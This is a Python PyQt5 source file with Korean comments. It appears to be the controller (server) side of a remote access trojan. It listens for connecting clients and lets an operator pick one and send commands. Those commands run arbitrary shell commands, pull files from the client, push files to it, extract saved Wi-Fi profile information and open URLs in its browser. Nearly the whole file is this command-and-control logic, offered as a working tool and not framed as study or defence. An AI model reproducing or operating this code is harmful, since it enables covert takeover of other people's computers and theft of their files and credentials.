from sendrecv import SendRecv
import socket
from datetime import datetime
import sys
import os
import subprocess
import time
from gui import Window, Worker
from PyQt5.QtWidgets import QApplication
from PyQt5.QtCore import pyqtSlot, QThread, pyqtSignal, QObject


class Server(QObject):
    def __init__(self, ip="0.0.0.0", port=8888):
        super().__init__()
        self.host_ip = ip # 로컬 테스트시 'localhost', 외부 테스트시 포트포워딩 & '0.0.0.0'
        self.host_port = port
        self.all_connections = {} # 연결된 소켓 저장 dict[ip] = {"controller":controller, "con": connection, "codec"}
        self.cur_con = None
        self.codec = self.get_codec()

        self.App = QApplication(sys.argv)
        self.window = Window(self)
        self.sock = self.create_socket(self.host_port)
        self.working_thread(self.connect_socket, self.progress_fn, self.upade_list, self.thread_complete)




    def __del__(self):
        for conn in self.all_connections:
            conn["controller"].send(b":kill")
            conn["con"].shutdown(2)
            conn["con"].close()

    def working_thread(self, func, progress, result, finish):
        worker = Worker(func)
        worker.signals.progress.connect(progress)
        worker.signals.result.connect(result)
        worker.signals.finished.connect(finish)
        self.window.threadpool.start(worker)

    def progress_fn(self, msg):
        self.window.append_message(msg)

    def upade_list(self, keys):
        self.window.listview_update(keys)

    def thread_complete(self):
        self.working_thread(self.connect_socket, self.progress_fn, self.upade_list, self.thread_complete)

    def create_socket(self, port):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host_ip, port))
            sock.listen(20)
        except socket.error as msg:
            self.window.append_message("소켓 생성 에러 : " + str(msg) + "")
            self.window.append_message.emit("10초 후 다시 시도 합니다... ")
            time.sleep(10)
            self.create_socket()

        return sock

        self.window.append_message(f"[*] 서버가 시작 됩니다 > {self.host_ip}:{self.host_port} | {datetime.now().strftime('%H:%M:%S')}")

    def connect_socket(self, progress_callback):
        try:
            conn, address = self.sock.accept()
            self.sock.setblocking(1)
            controller = SendRecv(conn)
            progress_callback.emit(f"[!]새로운 클라이언트가 연결되었습니다 => [{address[0]}:{str(address[1])}]")
            controller.send(":codec".encode("utf-8"))
            codec = controller.recv().decode("utf-8")
            address = f"{address[0]}:{str(address[1])}"
            self.all_connections[address] = {"controller": controller, "con": conn, "codec": codec}
            progress_callback.emit(f"{address} 연결 성공")
            return self.refresh(progress_callback)
        except:
            progress_callback.emit(f"{address} 연결 실패")
            return []


    def select_ip(self, target_ip):
        """ 명령을 내릴 연결된 ip를 선택한다 """
        try:
            self.cur_con = self.all_connections[target_ip]
            if self.cur_con is None:
                raise Exception()
        except:
            self.window.append_message("연결에 실패하였습니다 정보를 갱신하고 있습니다")
            self.refresh()

        self.window.append_message(f"{target_ip}에 정상적으로 연결되었습니다")

    def refresh(self, progress_callback=None):
        """ 연결된 클라이언트가 연결되어 있는지 확인&갱신 """
        for key in list(self.all_connections.keys()):
            try:
                controller = self.all_connections[key]["controller"]
                codec = self.all_connections[key]["codec"]
                controller.send(":check".encode(codec))
                data = controller.recv()
                if data == b":Done:":
                    continue
            except:
                del self.all_connections[key] # 연결이 끊긴 ip 삭제
                continue
        if progress_callback is None:
            self.window.listview_update(list(self.all_connections.keys()))
            return None
        else:
            return list(self.all_connections.keys())


    # :help :kill :codec :browse :download, :upload  :exec
    def control(self, command):
        """ 명령어 총괄하는 함수 """

        if not command.strip():
            return True

        if self.cur_con == None:
            self.window.append_message("[!]선택된 ip가 없습니다. ip를 선택해주세요")
        try:
            if command == ":help":
                self.window.append_message(self.help())
            elif ":download" in command:
                self.download(command)
            elif ":upload" in command:
                self.upload(command)
            elif command == ":kill":
                self.cur_con["controller"].send(b":kill")
                self.cur_con["con"].shutdown(2)
                self.cur_con["con"].close()
                self.cur_con = None
                self.refresh()
            elif ":exec" in command:
                command = "".join(command.split(":exec")).strip()
                if not command:
                    self.window.append_message("사용법 : :exec <명령어>")
                else:
                    try:
                        if "cd" in command:
                            path = "".join(command.split("cd")).strip()
                            os.chdir(path)
                        else:
                            output = self.runCMD(command).decode(self.codec)
                            self.window.append_message(output)
                        self.window.append_message(f'[Current Path] {os.getcwd()}')
                    except Exception() as e:
                        self.window.append_message(e.message)
            elif command == ":wifi":
                self.window.append_message("[*] 와이파이 프로필 정보를 얻는중...")
                self.cur_con["controller"].send(b":wifi")
                info = self.cur_con["controller"].recv()
                info = info.decode(self.cur_con["codec"])

                if info == ":Error":
                    self.window.append_message("[!] 에러! wifi정보를 클라이언트로부터 받아올수 없습니다")
                else:
                    self.window.append_message("[*] INFO:")
                    self.window.append_message(info + "")
            elif ":browse" in command:
                self.browse(command)
            elif command.lower() == "cls" or command.lower() == "clear":
                self.window.clear_message()
            else:
                self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
                data = self.cur_con["controller"].recv()
                if data.strip():
                    self.window.append_message(data.decode(self.cur_con["codec"]))

            self.cur_con["controller"].send(":getcwd".encode(self.cur_con["codec"]))
            cur_path = self.cur_con["controller"].recv().decode(self.cur_con["codec"])

            cur_ip = str(self.window.ip_list.currentItem().text())
            self.window.append_message("=========================================================")
            self.window.append_message(f"[{cur_ip}] {cur_path} >")
        except socket.error as e:
            cur_ip = str(self.window.ip_list.currentItem().text())
            self.window.appear_msgbox(cur_ip+"와 연결이 끊겼습니다", str(e))
            del self.all_connections[cur_ip]
            self.cur_con = None
            self.refresh()



    def download(self, filee):
        command = filee
        filee = "".join(filee.split(":download")).strip()

        if filee:
            filetodown = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
            self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
            down = self.cur_con["controller"].recv().decode(self.cur_con["codec"])
            if down == ":True:":
                self.window.append_message(f"[~] 다운로드 중... [{filetodown}]")
                with open(filetodown, "wb") as wf:
                    while True:
                        data = self.cur_con["controller"].recv()
                        if data == b":Done:":
                            self.window.append_message(f"[*] 다운로드가 완료되었습니다.\n[*] 파일 저장 위치 : {os.getcwd() + os.sep + filetodown}")
                            break
                        elif data == b":Aborted:":
                            wf.close()
                            os.remove(filetodown)
                            self.window.append_message("[!] 다운로드중 문제가 발생하였습니다.\n다운로드를 종료합니다")
                            return
                        wf.write(data)
            else:
                self.window.append_message("사용법 : :download <클라이언트에 있는 다운받을 파일 경로>")

    def upload(self, command):
        filetoup = "".join(command.split(":upload")).strip()
        if not filetoup.strip():
            self.window.append_message("사용법 : :upload <로컬에 있는 업로드할 파일 경로>")
        else:
            self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
            self.window.append_message(f"[~] 업로딩 중.. [{filetoup}]")
            with open(filetoup, "rb") as rf:
                for data in iter(lambda: rf.read(4100), b""):
                    try:
                        self.cur_con["controller"].send(data)
                    except Exception as e:
                        rf.close()
                        self.cur_con["controller"].send(b":Aborted:")
                        self.window.append_message(f"[!] 업로딩이 중지되었습니다!{e}")
                        return
            self.cur_con["controller"].send(b":Done:")
            savedpath = self.cur_con["controller"].recv().decode(self.cur_con["codec"])
            self.window.append_message(f"[*] 업로드 완료 :)\n[*] 파일 업로드 위치 : {str(savedpath).strip()}")

    def browse(self, command):
        url = "".join(command.split(":browse")).strip()
        if not url:
            self.window.append_message("사용법 : :browse <웹 사이트 URL>")
        else:
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            self.window.append_message(f"[~] 브라우저로 {url}을 열었습니다")
            self.cur_con["controller"].send(f":browse {url}".encode(self.cur_con["codec"]))
            self.window.append_message("[*] 완료")

    def runCMD(self, command):
        """ 터미널으로 명렁 실행 """
        cmd = subprocess.Popen(command,
                               shell=True,
                               stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        return cmd.stdout.read() + cmd.stderr.read()


    def help(self):
        return """
    Commands      Desscription
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    :help         도움메세지를 생성합니다
    :download     클라이언트로부터 파일을 다운 받습니다
    :upload       클라이언트에 파일을 업로드 합니다
    :kill         해당 클라이언트와 연결을 끊습니다
    :exec         외부 CLI에 명령을 합니다
    :wifi         클라이언트의 wifi 정보를 가져옵니다
    :browse       url로 부터 브라우저를 켭니다
    cd -          클라이언트의 이전 경로로 이동합니다
    cd --         클라이언트와 맨처음에 연결되었던 경로로 이동합니다
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """


    def get_codec(self):
        """ 해당 터미널 환경의 코텍을 확인&전송 """
        try:
            output = self.runCMD("chcp")
            codec = output.split(b":")[-1].strip().decode("utf-8")
        except:
            codec = "utf-8"
        return codec

   

s = Server("0.0.0.0", 8888)
sys.exit(s.App.exec_())